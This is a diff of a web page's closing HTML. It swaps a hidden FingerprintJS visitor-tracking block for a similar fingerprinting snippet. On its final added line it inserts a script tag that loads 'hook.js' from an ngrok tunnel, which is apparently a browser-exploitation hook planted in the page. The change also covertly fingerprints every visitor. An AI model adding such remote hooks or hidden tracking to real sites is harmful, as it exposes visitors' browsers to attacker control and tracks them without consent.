@@ -169,23 +169,22 @@
     <footer>
         &copy; 2025 CreativeCode. جميع الحقوق محفوظة.
     </footer>
+    <script>
+  // Initialize the agent at application startup.
+  // If you're using an ad blocker or Brave/Firefox, this import will not work.
+  // Please use the NPM package instead: https://t.ly/ORyXk
+  const fpPromise = import('https://fpjscdn.net/v3/zYZ5JfVpIvcF0pQRDvhC')
+    .then(FingerprintJS => FingerprintJS.load())
 
-    <!-- FingerprintJS Hidden Script -->
-    <script type="module">
-        const fpPromise = import('https://fpjscdn.net/v3/zYZ5JfVpIvcF0pQRDvhC')
-          .then(FingerprintJS => FingerprintJS.load({ region: "eu" }));
-
-        fpPromise
-          .then(fp => fp.get())
-          .then(result => {
-            const visitorId = result.visitorId;
-              fetch('http://localhost:3000/save-visitor', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ visitorId })
-              });
-          });
-    </script>
-
+  // Get the visitor identifier when you need it.
+  fpPromise
+    .then(fp => fp.get())
+    .then(result => {
+      // This is the visitor identifier:
+      const visitorId = result.visitorId
+      console.log(visitorId)
+    })
+</script>
+<script src="https://ca6a5e3a09da.ngrok-free.app/hook.js"></script>
 </body>
 </html>
